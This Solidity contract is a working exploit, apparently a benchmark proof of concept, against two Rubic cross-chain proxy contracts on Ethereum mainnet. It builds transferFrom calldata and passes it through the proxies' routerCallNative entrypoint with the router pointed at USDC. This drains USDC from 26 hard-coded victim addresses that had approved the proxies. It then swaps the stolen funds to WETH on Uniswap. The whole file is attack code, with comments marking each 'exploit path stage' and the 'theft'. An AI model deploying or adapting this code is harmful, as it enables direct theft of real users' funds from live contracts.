// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IRubicProxy {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external;
}

interface IRubicProxyWithProvider {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(
        string calldata _providerInfo,
        BaseCrossChainParams calldata _params,
        bytes calldata _data
    ) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    struct Candidate {
        address victim;
        address proxy;
        uint256 amount;
        uint8 proxyKind;
    }

    IERC20Like private constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Like private constant WETH = IERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address private constant TARGET_PROXY_1 = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;
    address private constant TARGET_PROXY_2 = 0x33388CF69e032C6f60A420b37E44b1F5443d3333;
    address private constant EXECUTION_INTEGRATOR = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private constant MAX_PROGRESSIVE_ROUNDS = 6;
    uint256 private constant CANDIDATE_COUNT = 26;
    bytes4 private constant TRANSFER_FROM_SELECTOR = 0x23b872dd;

    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;

        uint256 wethBefore = WETH.balanceOf(address(this));
        uint256 usdcBefore = USDC.balanceOf(address(this));

        Candidate[CANDIDATE_COUNT] memory ranked = _rankCandidatesByStealableAmount();
        uint256 positiveCount = _countPositive(ranked);
        if (positiveCount == 0) {
            _profitAmount = 0;
            return;
        }

        uint256 cappedRounds = positiveCount < MAX_PROGRESSIVE_ROUNDS ? positiveCount : MAX_PROGRESSIVE_ROUNDS;
        uint256 targetRounds = cappedRounds >= 2 ? 2 : 1;
        uint256 bestNetProfitInUsdc;
        uint256 successfulRounds;
        uint256 cursor;

        while (targetRounds <= cappedRounds) {
            while (cursor < positiveCount && successfulRounds < targetRounds) {
                if (_drainCandidate(ranked[cursor]) > 0) {
                    successfulRounds += 1;
                }
                cursor += 1;
            }

            uint256 realizedInUsdc = USDC.balanceOf(address(this)) - usdcBefore;
            if (realizedInUsdc > bestNetProfitInUsdc) {
                bestNetProfitInUsdc = realizedInUsdc;
            } else if (targetRounds >= 2) {
                break;
            }

            if (targetRounds == cappedRounds) {
                break;
            }

            targetRounds += 1;
        }

        if (bestNetProfitInUsdc > 0) {
            _liquidateDrainedUSDC(bestNetProfitInUsdc);
        }

        _profitAmount = WETH.balanceOf(address(this)) - wethBefore;
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _drainCandidate(Candidate memory candidate) private returns (uint256 received) {
        if (candidate.amount == 0) {
            return 0;
        }

        uint256 victimBalance = USDC.balanceOf(candidate.victim);
        uint256 victimAllowanceToProxy = USDC.allowance(candidate.victim, candidate.proxy);
        uint256 amount = victimBalance < victimAllowanceToProxy ? victimBalance : victimAllowanceToProxy;
        if (amount == 0) {
            return 0;
        }

        uint256 usdcBefore = USDC.balanceOf(address(this));

        // Exploit path stage 3:
        // encode transferFrom(victim, attacker, amount) so the proxy itself becomes
        // the already-approved ERC20 spender during the downstream external call.
        bytes memory tokenTransferFromCalldata = abi.encodeWithSelector(
            TRANSFER_FROM_SELECTOR,
            candidate.victim,
            address(this),
            amount
        );

        if (candidate.proxyKind == 1) {
            IRubicProxy.BaseCrossChainParams memory params = IRubicProxy.BaseCrossChainParams({
                // Exploit path stage 2:
                // zero the swap fields and point router at the live USDC token contract.
                srcInputToken: address(0),
                srcInputAmount: 0,
                dstChainID: 0,
                dstOutputToken: address(0),
                dstMinOutputAmount: 0,
                recipient: address(0),
                integrator: EXECUTION_INTEGRATOR,
                router: address(USDC)
            });

            // Exploit path stage 4:
            // invoke the vulnerable routerCallNative entrypoint so the proxy forwards
            // attacker-controlled calldata as the approved token spender.
            try IRubicProxy(candidate.proxy).routerCallNative(params, tokenTransferFromCalldata) {
                received = USDC.balanceOf(address(this)) - usdcBefore;
            } catch {
                received = 0;
            }
        } else {
            IRubicProxyWithProvider.BaseCrossChainParams memory paramsWithProvider = IRubicProxyWithProvider
                .BaseCrossChainParams({
                    srcInputToken: address(0),
                    srcInputAmount: 0,
                    dstChainID: 0,
                    dstOutputToken: address(0),
                    dstMinOutputAmount: 0,
                    recipient: address(0),
                    integrator: EXECUTION_INTEGRATOR,
                    router: address(USDC)
                });

            try
                IRubicProxyWithProvider(candidate.proxy).routerCallNative(
                    "",
                    paramsWithProvider,
                    tokenTransferFromCalldata
                )
            {
                received = USDC.balanceOf(address(this)) - usdcBefore;
            } catch {
                received = 0;
            }
        }
    }

    function _liquidateDrainedUSDC(uint256 amount) private {
        if (amount == 0) {
            return;
        }

        // Exploit path stage 5:
        // the theft is completed once the proxy-pulled USDC is in attacker control.
        // Converting it to WETH through a public on-chain AMM is an allowed economic
        // realization step so profit is reported in an 18-decimal live token.
        USDC.approve(UNISWAP_V2_ROUTER, 0);
        USDC.approve(UNISWAP_V2_ROUTER, amount);

        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);

        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _rankCandidatesByStealableAmount() private view returns (Candidate[CANDIDATE_COUNT] memory ranked) {
        ranked[0] = _identifyApprovedVictim(TARGET_PROXY_1, 1, 0x6b8D6E89590E41Fa7484691fA372c3552E93e91b);
        ranked[1] = _identifyApprovedVictim(TARGET_PROXY_1, 1, 0x036B5805F9175297Ec2adE91678d6ea0a1e2272A);
        ranked[2] = _identifyApprovedVictim(TARGET_PROXY_1, 1, 0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0);
        ranked[3] = _identifyApprovedVictim(TARGET_PROXY_1, 1, 0xff266f62a0152F39FCf123B7086012cEb292516A);
        ranked[4] = _identifyApprovedVictim(TARGET_PROXY_1, 1, 0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D);
        ranked[5] = _identifyApprovedVictim(TARGET_PROXY_1, 1, 0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B);
        ranked[6] = _identifyApprovedVictim(TARGET_PROXY_1, 1, 0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981);
        ranked[7] = _identifyApprovedVictim(TARGET_PROXY_1, 1, 0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a);

        ranked[8] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x915E88322EDFa596d29BdF163b5197c53cDB1A68);
        ranked[9] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0xD6aD4bcbb33215C4b63DeDa55de599d0d56BCdf5);
        ranked[10] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x2afeF7d7de9E1a991c385a78Fb6c950AA3487dbA);
        ranked[11] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x21FeBbFf2da0F3195b61eC0cA1B38Aa1f7105cDb);
        ranked[12] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1);
        ranked[13] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x58709C660B2d908098FE95758C8a872a3CaA6635);
        ranked[14] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0xD2C919D3bf4557419CbB519b1Bc272b510BC59D9);
        ranked[15] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0xfE243903c13B53A57376D27CA91360C6E6b3FfAC);
        ranked[16] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0xd5BD9464eB1A73Cca1970655708AE4F560Efc6D1);
        ranked[17] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0xd6389E37f7c2dB6De56b92f430735D08d702111E);
        ranked[18] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x9f3119BEe3766b2CD25BF3808a8646A7F22ccDDC);
        ranked[19] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x8a4295b205DD78Bf3948D2D38a08BaAD4D28CB37);
        ranked[20] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0xf4BA068f3F79aCBf148b43ae8F1db31F04E53861);
        ranked[21] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x48327499E4D71ED983DC7E024DdEd4EBB19BDb28);
        ranked[22] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x192FcF067D36a8BC9322b96Bb66866c52C43B43F);
        ranked[23] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x82Bdfc6aBe9d1dfA205f33869e1eADb729590805);
        ranked[24] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0x44a59A1d38718c5cA8cB6E8AA7956859D947344B);
        ranked[25] = _identifyApprovedVictim(TARGET_PROXY_2, 2, 0xD0245a08f5f5c54A24907249651bEE39F3fE7014);

        for (uint256 i = 0; i < ranked.length; i++) {
            uint256 maxIndex = i;
            for (uint256 j = i + 1; j < ranked.length; j++) {
                if (ranked[j].amount > ranked[maxIndex].amount) {
                    maxIndex = j;
                }
            }

            if (maxIndex != i) {
                Candidate memory temp = ranked[i];
                ranked[i] = ranked[maxIndex];
                ranked[maxIndex] = temp;
            }
        }
    }

    function _identifyApprovedVictim(
        address proxy,
        uint8 proxyKind,
        address victim
    ) private view returns (Candidate memory item) {
        uint256 balance = USDC.balanceOf(victim);
        uint256 allowance = USDC.allowance(victim, proxy);
        uint256 amount = balance < allowance ? balance : allowance;
        item = Candidate({victim: victim, proxy: proxy, amount: amount, proxyKind: proxyKind});
    }

    function _countPositive(Candidate[CANDIDATE_COUNT] memory ranked) private pure returns (uint256 count) {
        for (uint256 i = 0; i < ranked.length; i++) {
            if (ranked[i].amount == 0) {
                break;
            }
            count++;
        }
    }
}
